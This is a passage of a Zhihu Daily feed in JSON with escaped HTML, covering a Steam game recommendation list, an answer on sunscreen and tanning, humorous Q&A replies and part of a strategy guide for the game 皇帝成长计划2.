元</strong></p>\n<p><strong>画面是真的太舒服了，极具美感的沙雕游戏。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-161b2ac40760ec207e5f45b8b663d351_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>深海迷航&amp;深海迷航：零度之下 40 元</strong></p>\n<p><strong>生存建造附带解密，剧情极佳。好评如潮就不用我多说什么了吧，(希望异灵术老师老年人活动播一 bo 这个</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-94f4d2ec03cf1520798a9b569a8ae0e5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-897494b896c6d9db42928d96cb1ee16c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Unturned 免费</strong></p>\n<p><strong>17 年的像素风 3D 生存，逗比开黑，跟人类一败涂地有的一拼。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-da794edd7380ad5730dd0678345f319f_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>流放者柯南 52 元</strong></p>\n<p>和好友一起玩，类似方舟，算得上神作了，不过因为优化和服务器问题可能评价稍低。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-915b91aec9a4693c7285ba8dd8d21eca_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>4. 生存&amp;建造&amp;模拟(策略)2D 类</strong></p>\n<p><strong>Klei 饥荒联机版 9 元</strong></p>\n<p>很好很好玩，好玩到当初可以单机版局域网一起玩几天几夜。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-234d47afc2af09abad7c0a384771a695_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>缺氧 24 元</strong></p>\n<p>缺氧算是担任生存策略类，因为是 Klei 的精品，这里也是强烈安利。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-730374ad9a4ac068d170c6cbf609a22e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>泰拉瑞亚 12 元</strong></p>\n<p>经典像素风格老游戏，如果你仔细看看 steam 老玩家，大家库里都有这款游戏。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-516e9887203e8f4cce6bf51c37191c60_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>星露谷物语 28 元</strong></p>\n<p>也是像素风，非常非常非常非常耐玩 hhh，大家千万不要觉得像素就感觉像是很古老的游戏，实际上一款游戏能获得成功的点相当多</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-de3c1c0a1b23ad140cdd06cde6b86066_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>异星工场 60 元</strong></p>\n<p>模拟经营，比较考验大局观，需要学习慢慢上手，但是强烈推荐，非常非常有意思，很耐玩。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-690005be224993e056745e8b4ebe0626_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>环世界 89 元</strong></p>\n<p>印象中外号是从不打折，然而这款从不打折 shi 好评如潮 98%的好评率，算不算必买大家说了算~</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-0e28655be20e8c58aed3f0e2ee742ae5_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Kenshi 53 元</strong></p>\n<p>画面和优化不算很好，但是可能跻身神作系列，沙盒游戏巅峰，画风慎入（许多玩家表示不习惯</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4cde32a2470f626cef17c1792299ffe1_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>太空工程师 60 元</strong></p>\n<p>太空爱好者必入，也是一款太空题材，这是真太空良心游戏，资料片不是噱头！！并不算主打可玩性，就是让大家把想象变成手里的游戏，再也不用脑补太空了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-179d9f3c8d27af5c431390cda3200cc0_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>The Isle 34 元</strong></p>\n<p>并不强推，恐龙爱好者可以入</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-be6808ebf5108fbc590ed03590646316_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong> 5. 11bit 这是我的战争 </strong></p>\n<p><strong>入季票完整版大概 30 元左右</strong></p>\n<p><strong>我为他单独出一个标题大家就懂为什么要买 11bit 的游戏。</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-7a8414378599678c99045df70b1ff19e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Frostpunk 加上最后的秋天全 DLC 100 元左右</strong></p>\n<p>一个“跑偏了”生存策略游戏，要满足这帮子人真难啊，玩后你会有许多新鲜的感悟，但是结局有点强行喂食的感觉。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b64914a54fc7581c91bf9c3c21c950e2_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>6. 剧情类&amp;独立游戏类（神作警告</strong></p>\n<p><strong>极乐 disco 92 元</strong></p>\n<p>真的是神作，文本量大，RPG 感极佳，英语好的玩，中文也快出了（评论区说什么没有中文版的就让我不推荐，显然这种观点是相当极端的，如果这么较真是不是要只玩国产游戏呢？</p>\n<p>虽然有的厂商因为各种各样有心无心的原因没有推出中文，但是也有英文好或者是为了玩某款游戏学外语的玩家，起码站在游戏的角度，游戏内容没有体现任何的 bias，我觉得就可以玩。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-37a2cb4b38a14899ed28e1373131acb7_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Gris 28 元</strong></p>\n<p>bgm、氛围唯美，画风好，2019Steam 大赏得主</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6e23e81ed4f488298ca779b8e4a74c88_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>去月球&amp;寻找天堂 一共 30 元左右</strong></p>\n<p>Goooooooooooooooooood story. 神作中的神作。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-1e4072138ea4c762cf2238228f925935_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-ce9b05c9864d5382313db32eb36c1cea_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>艾迪芬奇的记忆 27 元</strong></p>\n<p>2017TGA 最佳叙事，最佳影响力，最佳独立游戏</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c0552d42e84a61bc52fc3f6e6f1e66bb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>SE 奇异人生 1&amp;2 加起来 100 元左右</strong></p>\n<p>美国高中生的故事，神作中的神作。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a3f9b06b711f204a79efae0d8b0c9a06_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-17c066a6c0833fcd26e058d11ac4229a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Inside&amp;limbo 20 元左右</strong></p>\n<p>解密游戏巅峰之作，玩完会有许多深层的思考。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3b52c73d0212bcd84a3d8650102ea1cd_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-ced396d48914f58be7d3e35242d725e6_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>卡普空 逆转裁判 81 元</strong></p>\n<p>神级动漫，不多说，喜欢该剧的二刺螈必入，无感的如果剧情类玩的差不多，可以试试逆转裁判，期待续作</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-73d5230e37ba128abce1b6ed8ebec78c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>奥博拉丁的回归 49 元</strong></p>\n<p>推理神作，画风特殊</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-831db72380e2b9f282524e6ddcfa403f_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>旁观者 1&amp;2+ 奥威尔 12 加起来 100 元左右</strong></p>\n<p>我最喜欢的 198 4，老大哥模拟器√</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-cb77c1f747bd6c26c2af83d6b7cf04c6_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>7. 策略类 / 欢乐（实际上我已经很难继续分类了，很多游戏属性相当多</strong></p>\n<p><strong>杀戮尖塔 40 元</strong></p>\n<p>这是我心目中和 mirror 接近的神作，可惜 mirror 只会活在我这句话中。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-fcde027eef3af8c51b965e7015668a85_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>影子战术：将军之刃 28 元</strong></p>\n<p>画风很好，策略性很不错，比较耐玩</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3963829d78f3fc33ad4a2ecbb7e49b28_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>双点医院 54 元</strong></p>\n<p>看女流玩的，当时很火的经营模拟类游戏</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a469a6cbe423c8a2ce90ae7349dcd283_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>分手厨房 2 54 元</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a15ed935f8629e88319e153d32eae977_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>火箭联盟 3 元</strong></p>\n<p>把他放在最后一个，大家可能没有想到，这个在国外很火，u1s1，球枪车，这款游戏占了两</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-00ed8373cccd27938b8dc2095e62f819_720w.jpg?source=8673f162\" alt=\"\"></figure><hr>\n<p>疫情期间，请大家务必不要掉以轻心，以安全为准。</p>\n<p>最后，祝大家游戏愉快~</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/35296900\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737582"},{"title":"为什么涂了防晒还会晒黑？「皮肤越黑越容易晒黑」是真的吗？","date":"2021-06-29 23:07:40","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>化妆品配方师；美妆科普人；公众号：凡可美肤实验室</span>\n<a href=\"https://www.zhihu.com/question/464452373/answer/1950846013\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>一、先说结论吧</strong></p>\n<p>题主的两个问题跨度其实都挺大，但是可以肯定的告诉大家，<strong>皮肤越黑的人确实的越容易晒黑，尤其是天生黑或者从小皮肤比较偏黑的；皮肤白的通常更容易晒红晒伤。</strong></p>\n<p>至于涂了防晒还会晒黑这个问题，大概率是实际操作方法有问题：例如防晒产品的选择，防晒产品的使用场景，也就是所处的环境紫外线有多强，防晒霜的量有没有涂足够，防晒霜时间长失效后没有及时的补涂，就是操作上的细节都会影响实际使用效果。</p>\n<p>我以前回答的内容里，写过关于防晒品的选用</p>\n<p><a href=\"https://www.zhihu.com/question/27735674/answer/643072593\">真的需要每天涂防晒吗，防晒霜对皮肤有害处吗？</a></p>\n<p>还有防晒霜指数的问题，量涂得不够，效果会很打折扣的</p>\n<p><a href=\"https://www.zhihu.com/question/362532097/answer/952286392\">防晒霜涂不够量，是没有防晒作用？还是防晒作用比起其标注指数会打折扣？</a></p>\n<p><strong>二、基因决定了你肤色最白的“天花板”</strong></p>\n<p>我们皮肤的肤色受很多因素的影响，我们先来了解一下你最白的肤色是怎么构成的，也就是你皮肤最白的天花板。</p>\n<p>这点可能大家都知道，都是基因决定的，<strong>目前已知超过有 125 种基因可以调节肤色</strong>。皮肤黑的人和皮肤白的人在黑色素细胞（也就是黑色素的生产工厂）的数量上并没有太大的区别。但是却造就了形形色色的肤色，就是因为有很多基因以及后天的因素在影响着肤色的组成。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-638adc07236473405011f3c6bbfcc099_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>三、皮肤越黑意味着黑色素的“生产能力”更强</strong></p>\n<p>黑色素的合成是非常复杂的反应，从皮肤受到紫外线以及损伤的刺激，启动相应的黑色素合成流产，把黑色素生产出来并逐步转运到皮肤的表面，呈现更深的肤色，中间的反应环节，涉及的信号路径、调控等很复杂。</p>\n<p>不过总的来说，皮肤越黑也就意味着你本身皮肤的黑色素生产和转运的能力更强，而且黑色素的代谢速度更慢。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-774ad9a3ef90fefeb26a44941de6975b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这一点我自己深有体会，小时候有长时间的暴晒史，肤色天生也比较黑。虽然自己很长时间在研究美白淡斑化妆品，在防晒方面也注意的很到位，还经常使用美白产品。不过一旦出去无防护地晒一圈回来，不是很快就黑好几个度，而且后期需要很长时间的维护才能逐渐的白下来。</p>\n<p>有些朋友是肤色天生比较白的，尽管大家的生活环境和防晒习惯差不多。一起出去玩一圈，接受相近的紫外线暴露，晒一圈回来后，皮肤发红几天，不过很快又会白下来。</p>\n<p><strong>四、哪些坑可能导致涂了防晒还会晒黑？</strong></p>\n<p>防晒，对于皮肤保养，抗衰老和美白都是很重要的措施，要做好防晒需要注意的细节还真不少。但是防晒没注意好的话，足够可以让你养了一个秋冬季节才白下来的肤色，晒半天时间可以毁于一旦。</p>\n<p>为什么涂了防晒还会晒黑？不排除有很多极端案例，我认为原因有以下方面：</p>\n<p>第一，<strong>防晒指数选的不够</strong>。这个非常好理解，例如大中午的非常强的紫外线，去沙滩游玩什么的，却选个 spf35 的防晒，不黑才怪。</p>\n<p>第二，<strong>防晒指数选择没问题，但是没涂够</strong>。防晒产品的数值是在标准用量（2.00±0.05）mg/ 平方厘米的情况下测试出来的，如果你的用量低于标准用量，也就是没用够，那可能是涂了个寂寞。</p>\n<p>第三，<strong>可能是错误的使用场景</strong>。例如去海边游玩，却选择了抗水性非常差的防晒产品。大多数的防晒都是油包水或者硅油包水的体系，肤感会相对油腻，水包油的防晒优点是清爽，但是抗水性很差。天气热出汗很多，或者漂流玩水等等都会冲掉水包油的防晒，这种场景当然也会晒黑。</p>\n<p>第四，<strong>没有及时的补涂</strong>。这种场景其实不多，假如你是在户外长时间（4 小时以上）的暴露，才需要多次的涂抹防晒产品。化学防晒剂吸收紫外线会不停损耗，越来越少甚至失效；在玩耍过程中会不停的碰擦，也会蹭掉皮肤的防晒成分。所以长时间在户外的话，需要注意及时的补涂。</p>\n<p>最后要补充的一点是，防晒不能仅仅指望防晒霜，有时候加一件品质不错的防晒衣，帽子、墨镜、遮阳伞等，或者能够尽量避开在强紫外线时候外出，往往能够实现更好的防晒效果。</p>\n<p>要知道，紫外线带来的不仅仅是肤色变黑，也会加速皮肤的衰老，以及引发起来更多的皮肤问题。皮肤受到紫外线的刺激，合成出更多的黑色素，其实是人体免疫系统自我保护的一种行为。我觉得晒黑背后的问题还更值得引起注意的。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/464452373\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737587"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-06-29 23:07:34","description":"\n<div>\n<h2>第一次带女朋友回家让她做饭结果她大发雷霆，我真错了吗？</h2>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-401ff4d5911340b349543c8b75645841_l.jpg?source=8673f162\"><span>粥六，</span><span>只接玫瑰的梗</span>\n<a href=\"https://www.zhihu.com/question/51990987/answer/1708967992\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这是厨子应聘？交面试作品？</p>\n<p>下面是我的建议：</p>\n<p>高情商：考试之前你不一定要划重点，但请务必给考生自主报名的权利。</p>\n<p>低情商：在你通知她去你家做饭挣表现分之前，你先问问她要不要挣这个分，愿不愿意去你家做饭。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/51990987\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>恋爱时给女朋友钱让她给我代买了70元的物品，分手后物品还没给我，我能够提起民事诉讼吗？</h2>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-4bb947353157cf00c7029db8b10284be_l.jpg?source=8673f162\"><span>方舟，</span><span>触不到的总是最好的，如风，如你。wechat：law_fz</span>\n<a href=\"https://www.zhihu.com/question/437856842/answer/1661837812\" hidden>阅读原文</a>\n</div>\n<div>\n<p>可以的，但是得先交诉讼费 50……</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cd73b3660fd31999b02c0fbc9d4ce2a8_720w.jpg?source=8673f162\" alt=\"\" width=\"668\"></figure><p> </p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/437856842\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>假如在古代你当御厨给皇帝泡一碗方便面会发生什么？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-c3e2b675c983bd94d187466c815dea9a_l.jpg?source=8673f162\"><span>阿撒托斯乐队总指，</span><span>从来没有什么天经地义，只有习以为常！</span>\n<a href=\"https://www.zhihu.com/question/396487713/answer/1735818168\" hidden>阅读原文</a>\n</div>\n<div>\n<p>面还好说</p>\n<p>估计你放调料包的时候，会被大内侍卫一刀捅死。</p>\n<p>毕竟太像下毒了。</p>\n<p> </p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/396487713\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>你对空姐提出过最奇怪的要求是什么?</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-60ae2f11c5084bc544a0c48883fcbe78_l.jpg?source=8673f162\"><span>背离，</span><span>碰到傻子会预防性拉黑的。</span>\n<a href=\"https://www.zhihu.com/question/351400808/answer/884733302\" hidden>阅读原文</a>\n</div>\n<div>\n<p>并不是对空姐提出的奇奇怪怪的要求，就是坐飞机的一个比较好玩的事。</p>\n<p>有一次出差，头一天晚上打了半宿的麻将，第二天感觉要升仙了。</p>\n<p>上飞机的时候，空姐可能看我一脸迷茫觉得我找不到自己的位置，于是——</p>\n<p>“先生您好，请问您是哪个座？”</p>\n<p>我可能也是没睡醒，愣了一下，“射手座……？”</p>\n<p>我明显看到空姐脸部肌肉不自然的抽动了一下……</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/351400808\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>为什么平常穿汉服就会让路人觉得很奇怪？</h2>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-c05deb6f3eddcc06906309cd86acd51e_l.jpg?source=8673f162\"><span>痴情蛊灬DOM，</span><span>一个发言都要谨小慎微的平台，退了</span>\n<a href=\"https://www.zhihu.com/question/323257745/answer/678589574\" hidden>阅读原文</a>\n</div>\n<div>\n<p>你穿的汉服，放古代出门路人也看你</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/323257745\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9737597"},{"title":"游戏《皇帝成长计划2》攻略有哪些？","date":"2021-06-29 15:30:07","description":"\n<p></p>\n<hr>\n<p>好兄弟们，我大一了，来更新了</p>\n<p>对本篇内容进行了更新与修改</p>\n<p>我创立了一个公众号叫【羊村大战魔仙堡】</p>\n<p>我这里面分类了一下攻略 希望更能清楚明了的帮到大家</p>\n<p>现在内容还比较少 但是在陆续更新 欢迎大家关注</p>\n<p>没有关注也没关系，会在知乎更新的哟</p>\n<hr>\n<p>这个游戏从小学大概4年级就开始玩了               现在高三了                                                              出来手游版                                                               越来越好啦                                                                                                                           </p>\n<p>有人看就再总结一下我玩的经验(个人总结，可能不够准确)：</p>\n<p><b>最最最重要的一点：一定要养成存档的好习惯!玩稍微久一点就黑屏，就什么都没有了!!!</b></p>\n<p>目前没有苹果手机的版本 但是苹果端玩家可以浏览器搜索皇帝成长计划2h5 点进4399在线玩(好消息，苹果端在2020.10.10上线啦！)</p>\n<p>1.前期最好不要过多招兵买马，容易破产</p>\n<p>2.前期多多贸易，能够让你不用克制去嚯嚯钱(推荐存档后再开始第二月，尽量刷成盈利)</p>\n<p>3.没钱可以尝试去东厂——查看把柄——东厂查办犯事官员——依法处理 可能抄家收获不菲</p>\n<p>4.智能建设才是根本上增加国库的！！！每天请坚持！！！</p>\n<p>5.<b>刷属性</b>：前期我一般都郊外先刷体能 然后尽量智慧多刷武力少刷 一般后期后期我都会让体能 智慧 武力 道德都700以上(为了教育皇子)</p>\n<p>6.<b>刷近臣</b>推荐的性格是：聪明 理想 独立(送礼多)</p>\n<p>7.我觉得<b>御医楼</b>的最高位置最好刷到4(能够省时间：一般+35 特殊全满 )</p>\n<p>8.培养皇子的话，最好不要太快立为太子，先派遣历练，如果已经立了的话，也可以通过送珍宝加属性(和大臣一样)</p>\n<p>9.皇子派遣历练：尽量选<b>出任幕僚</b>吧 加的属性一般多一点(不要忘记去宗人府或者养心殿给他们奖赏) 有些<b>皇子出游</b>会带粽子(+12大臣亲密度)之类的宝物，需要就选(不保险，可能会减属性)</p>\n<p>10.腊月和八月的晌午我一般都回去<b>御膳房</b>举办宴会(上限是50大臣)</p>\n<p>11.一般二月你去找道士前 你去青炉房炼什么药 他就给你什么药</p>\n<p>12.<b>打仗</b>先打日本(简单) 最后再打把安南、大理等小国(他们是材料获取的主要方式)                      打仗的时候好的将领真的很重要(能发动技能)！                                           而且打仗时人数多一倍以上的话最好选全面攻击        人数不多就突袭</p>\n<p>13.前期丞相一定是要先安排属性高的 天灾人祸国库遭不住</p>\n<p>14.知府要野心小 道德高(起义也遭不住)               高智商、高道德的地方官会减少贪污，提高地方的经济。</p>\n<p>15.在丞相是名臣后最好每天都要科举，10个蓝臣必出一个90+的蓝臣。</p>\n<p>16.第一年五月去云渡湖钓鱼送名臣(林烟or重庆)和一个名妃(春晖仙女)</p>\n<p>17.大雁塔太香了！真的推荐！(玩法已放在最下面)</p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/b18e9edf8bf2694f2620da4c9edb4eba\" data-hash=\"b18e9edf8bf2694f2620da4c9edb4eba\" data-hovercard=\"p$b$b18e9edf8bf2694f2620da4c9edb4eba\">@友善的眼神</a> 评论区的大佬，我觉得很有道理，大家可以参考一下下</p>\n<p><img src=\"https://pic3.zhimg.com/v2-69fc109391ab6be135278c512583263d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"959\" data-rawheight=\"818\" data-watermark=\"watermark\" data-original-src=\"v2-69fc109391ab6be135278c512583263d\" data-watermark-src=\"v2-6b9051c86362c1ced40e78f8d0617ca8\" data-private-watermark-src=\"v2-a48db9e169447748f38ec170d65852f1\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0b30f6205e48ebebaa73e23f3e7bc4e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1378\" data-watermark=\"watermark\" data-original-src=\"v2-0b30f6205e48ebebaa73e23f3e7bc4e2\" data-watermark-src=\"v2-894556cc4b0556832dc9f61edfc12b5a\" data-private-watermark-src=\"v2-c1c0664b26da7322829190d826368bbf\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bed2370198b00328a4ae71a15652bb9d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1180\" data-watermark=\"watermark\" data-original-src=\"v2-bed2370198b00328a4ae71a15652bb9d\" data-watermark-src=\"v2-e34f3fa5ef6454fd5f61b32df91f3574\" data-private-watermark-src=\"v2-7b1a2f73944b0c24a0fa2665d7a90674\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f81c85deddf69bccea2cadd329dd9374_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"450\" data-rawheight=\"85\" data-watermark=\"watermark\" data-original-src=\"v2-f81c85deddf69bccea2cadd329dd9374\" data-watermark-src=\"v2-289a93acebfe87fce9034a0c4f7d676c\" data-private-watermark-src=\"v2-39f77a69e4cc648f1f39e02d46eba571\"></p>\n<p>以下是大佬们的总结：</p>\n<h2><b>一、特殊事件事件/人物</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/7vhfTVLwQstOYXcA_mGH5A\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-47c78d5eca948d9046c559ea106790bb_bh.jpg\" data-image-width=\"779\" data-image-height=\"332\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——特殊事件、人物</a><p><img src=\"https://pic3.zhimg.com/v2-d7b3b268caea7d8b3b50eece7a79214d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"1140\" data-watermark=\"watermark\" data-original-src=\"v2-d7b3b268caea7d8b3b50eece7a79214d\" data-watermark-src=\"v2-6858520aaf4fbf85bb7a09d4ffc0c4d8\" data-private-watermark-src=\"v2-c119aac05a0555913b33162d9789ed7f\"></p>\n<p>可从路人获取的东厂线索合集：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-83d8b2a08b825bad522f08d23c3a6000_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"627\" data-rawheight=\"694\" data-watermark=\"watermark\" data-original-src=\"v2-83d8b2a08b825bad522f08d23c3a6000\" data-watermark-src=\"v2-af894712fdeeda3aed03cb97e9956a1d\" data-private-watermark-src=\"v2-84e66e361336f482d9e74b4554b92162\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ea20f2d354dfc35d739e15dbef7f825e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1346\" data-watermark=\"watermark\" data-original-src=\"v2-ea20f2d354dfc35d739e15dbef7f825e\" data-watermark-src=\"v2-a31ce9b2d79db0c03e3ac260c11282a9\" data-private-watermark-src=\"v2-142c76356efb91f639444dc727fd500c\"></p>\n<p>皇帝的成长计划2吧 来自 素素偶的 的总结</p>\n<p><img src=\"https://pic3.zhimg.com/v2-610ec057f01a02b83774ba74322ccbce_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"799\" data-watermark=\"watermark\" data-original-src=\"v2-610ec057f01a02b83774ba74322ccbce\" data-watermark-src=\"v2-13954aa6a9be75ac19d44a4b4dbea8fd\" data-private-watermark-src=\"v2-791268d0073f17fa6eda6aab5051439a\"></p>\n<p>皇帝的成长计划2吧 来自 叶子风气质大叔 的总结</p>\n<p><b><i>包打听找随从</i></b></p>\n<p>注意事项：</p>\n<p>1、职业只代表出现人才的几率，不代表一定出现人才</p>\n<p>2、职业称谓和询问结合来看</p>\n<p>3、询问的适合文武最好要区分开来，根据常识做一些判断，例如山贼这些职业后千万不要去选道德或者文学，落榜书生什么的也不用选武术了</p>\n<p>4、sl才是避免错过人才的王道</p>\n<p>5、介绍名臣就直接录用吧，名臣会直接进入朝廷，而普通随从只会进入东厂</p>\n<p>职业称谓：</p>\n<p>S级:江湖隐士，武林隐士</p>\n<p>(基础属性强，尤其道德普遍都不低，就算是非酋，选它人才都差不到哪里去，出极品的概率高,人才属性一般情况下轻松破85)</p>\n<p>A级:突厥彪骑，突厥射手，东瀛忍者，漠北刀客，民间文豪，大家才子，史学家等</p>\n<p>B级:绿林好汉，江湖义士，独行侠，雇佣军，退役军人，山贼当家，落榜书生，诗人</p>\n<p>C级:各种商人（骏马、盐市、木材、兵器等等)</p>\n<p> (基础素质类似科举人员，感觉出极品的概率比D级那些要低，适合用来做贸易）</p>\n<p>D级:逃狱犯，采花贼，江湖神棍，醉酒大汉</p>\n<p>（如果询问武艺的话，出人才的概率要大于C级）</p>\n<p>询问等级：</p>\n<p>文武</p>\n<p>S级:天生神力、天赋异禀</p>\n<p>A级:这样的天赋简直让人过目不忘，真是登峰造极啊，这人的前途真是让人期待</p>\n<p>B级:一点都不比朕的侍卫差，还不错回答的也算巧妙</p>\n<p>C级:真是浪费我时间，差强人意，这个真不会被一拳撂倒, 感觉连自己都保护不了,勉勉强强把，浪得虚名等等</p>\n<p>道德</p>\n<p>S级:真是菩萨心肠,得道高僧</p>\n<p>A级:此人还真是让人期待</p>\n<p>B级:勉勉强强吧，道德观还算正常，只能算是善良之人吧，只有山贼会这么回答吧</p>\n<p>C级:贪污无德之人想必都会这么说吧</p>\n<p>D级:简直是个人渣,这也算人，最多做到管好自己吧</p>\n<p>（关于包打听出现的时间、地点前面已经说过了，再啰嗦一遍：包打听会在每年春季上旬（一月）和秋季上旬（七月）出现，在京城的一品楼，包打听会推荐各种各样的人才，运气好可以遇到名臣。）</p>\n<hr>\n<h2><b>二、青炉房(炼制丹药)</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/fve_GUNi9Zpit5IdwSyg0A\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-cfed8ab18ead1a0e476c8ec6c3d506e6_bh.jpg\" data-image-width=\"864\" data-image-height=\"368\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow 